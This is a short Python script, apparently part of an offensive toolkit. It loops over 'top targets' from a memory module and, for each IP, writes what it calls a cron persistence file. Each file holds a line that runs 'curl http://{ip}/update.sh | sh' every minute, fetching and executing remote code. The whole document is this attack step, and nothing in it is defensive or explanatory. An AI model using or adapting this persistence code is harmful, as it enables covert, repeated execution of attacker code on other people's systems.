import os
import random

from memory_engine import get_top_targets


def deploy_cron_seed(ip):
    print(f"[+] Writing cron persistence for {ip}")
    path = f"/data/data/com.termux/files/usr/tmp/cron_{ip.replace('.', '_')}"
    with open(path, "w") as f:
        f.write(f"* * * * * curl http://{ip}/update.sh | sh\n")


if __name__ == "__main__":
    for t in get_top_targets():
        ip = t.split(":")[0]
        deploy_cron_seed(ip)
